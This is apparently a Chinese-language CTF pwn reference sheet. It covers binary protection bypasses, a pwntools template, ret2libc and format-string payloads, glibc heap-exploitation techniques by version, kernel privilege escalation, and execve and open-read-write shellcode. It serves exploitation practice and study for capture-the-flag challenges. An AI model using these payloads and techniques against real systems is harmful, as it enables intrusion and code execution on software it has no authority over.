# Pwn 方向解题参考

## 1. 前置检查

```bash
file pwn            # 架构
checksec pwn        # 保护机制
# RELRO: Full/Partial/No  |  Canary: 有无栈保护
# NX: 栈不可执行  |  PIE: 地址随机化
```

| 保护 | 绕过思路 |
|------|---------|
| NX 开 | ROP / ret2libc / ret2csu |
| Canary | 泄露 canary / 格式化字符串读 / 覆写 __stack_chk_fail@got |
| PIE | 泄露程序基址 / 部分覆盖（低字节） |
| Full RELRO | 不能改 GOT → 改 __free_hook / __malloc_hook (glibc<2.34) / libc 周边指针 |
| Partial RELRO | ret2libc 时可考虑 GOT 改写 |

**glibc 版本识别**：泄露 libc 函数地址末三位 → 查 libc-database；题目附带 libc.so 时用 `strings libc.so | grep "GNU C Library"` 确认版本。

## 2. pwntools 基本模板

```python
from pwn import *
context.arch = 'amd64'      # 或 'i386', 'arm'
context.log_level = 'debug'
# p = process('./pwn')
p = remote('1.2.3.4', 9999)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

p.sendline(payload)
p.interactive()
```

## 3. 栈溢出

```python
# 1. 确定偏移: cyclic(200) + cyclic_find(payload开头4字节)
offset = cyclic_find(0x61616168)
# 2. 有后门函数 (溢出点 → 函数地址，64位需栈对齐)
payload = flat(b'A'*offset, pop_rdi_ret, binsh_addr, ret_gadget, backdoor)
# 3. ret2libc (64位)
pop_rdi = next(elf.search(asm('pop rdi; ret')))  # ROPgadget --binary pwn | grep "pop rdi"
ret = next(elf.search(asm('ret')))               # 用于 16 字节栈对齐
payload = flat(b'A'*offset, pop_rdi, elf.got['puts'], elf.plt['puts'], elf.symbols['main'])
# 泄露 got 地址算 libc 基址: base = leak - libc.symbols['puts']
# 二次溢出: one_gadget 或 system("/bin/sh")
# 32 位 ret2libc 直接平铺参数: [system][fake_ret][binsh]
```

**one_gadget**：`one_gadget libc.so.6`，注意约束条件（寄存器/栈要求）

## 4. 格式化字符串

```python
# 1. 确定偏移: AAAA%p%p%p%p 看第几个 0x41414141
# 2. 读内存 (泄露): %n$p 直接读，或 fmtstr_payload(offset, {addr: value}) 写内存
# 32 位写: fmtstr_payload(7, {elf.got['printf']: elf.symbols['system']})
# 64 位注意前 5 个参数在寄存器 (rdi rsi rdx rcx r8)，偏移从 6 开始
# 泄露栈/canary/libc: %15$p 等，配合 fmtstr 偏移探测
# %n 写入长度限制 → 分字节写 %hhn
```

## 5. 堆利用路线

```bash
# glibc 版本对应主要技术:
# 2.23  : fastbin attack / unsorted bin attack / House of Force / double free
# 2.27  : tcache (double free 检查弱) / tcache poisoning / hook 利用
# 2.29-2.33 : tcache key 检查 / PROTECT_PTR(2.32+) 指针加密
# 2.34+ : hook 移除 → FSOP / _IO_FILE / exit_funcs / tls_dtor_list
```

常见手法：
- **UAF**：free 后指针未清空 → 修改 fd/tcache next 指向 target
- **Double Free**：fastbin 环 + tcache dup
- **Tcache Poisoning**：篡改 next 指针 → 任意地址 malloc（2.32+ 需处理 PROTECT_PTR 异或）
- **Off-by-one/null**：构造 chunk overlap
- **Unsorted Bin Attack**：写 libc 地址到目标（2.29 后有 size 检查）
- **House of XXX 系列**：按版本选（Cat/Force/Spirit/Lore/Emma）
- **FSOP**：伪造 `_IO_list_all` / vtable（glibc 2.24+ vtable 有检查 → `_IO_str_jumps` / house of apple）

调试：`gdb` + pwndbg，`heap`、`bins`、`tcache` 命令观察堆状态

## 6. 其他题型

| 题型 | 要点 |
|------|------|
| 整数溢出 | 有符号/无符号转换、`malloc(-1)`、size 检查绕过 |
| 栈迁移 | `leave; ret` 控 rbp，把栈换到 bss/堆 |
| ret2csu | 64 位缺少 gadget 时用 `__libc_csu_init` 控制三个参数寄存器 |
| SROP | 用 sigreturn 布置寄存器（需要 syscall gadget） |
| ret2syscall | 32 位常考：`execve("/bin/sh",0,0)` 依次 pop eax/ebx/ecx/edx + int 0x80 |
| ORW | seccomp 禁 execve → open/read/write 读 flag |
| seccomp 分析 | seccomp-tools dump ./pwn |
| 沙箱/禁系统调用 | 用 ORW 或 openat2 等 |
| VDSO / ret2dlresolve | 无 libc 泄露时伪造重定位 |
| C++ 题 | 虚表劫持、堆上对象 UAF 改 vtable |
| Kernel pwn | bzImage + .ko，ROP 提权 commit_creds(prepare_kernel_cred(0)) |

## 7. Shellcode

```python
context.arch = 'amd64'
shellcode = asm(shellcraft.amd64.linux.sh())
# 受限字符集 (alphanumeric) → msfvenom 或 AE64 编码
# ORW shellcode:
sc = asm('''
    mov rax, 2; lea rdi, [rip+flag]; xor rsi, rsi; syscall
    mov rdi, rax; mov rax, 0; mov rsi, rsp; mov rdx, 100; syscall
    mov rax, 1; mov rdi, 1; mov rsi, rsp; mov rdx, 100; syscall
    flag: .string "/flag"
''')
```

## 8. 常用命令速查

```bash
ROPgadget --binary pwn --only "pop|ret" | grep rdi
one_gadget libc-2.31.so
# 查符号偏移: readelf -s libc.so.6 | grep system
# patchelf 换 libc 运行:
patchelf --set-interpreter ./ld-2.31.so --replace-needed libc.so.6 ./libc-2.31.so ./pwn
# 或者用 glibc-all-in-one
```
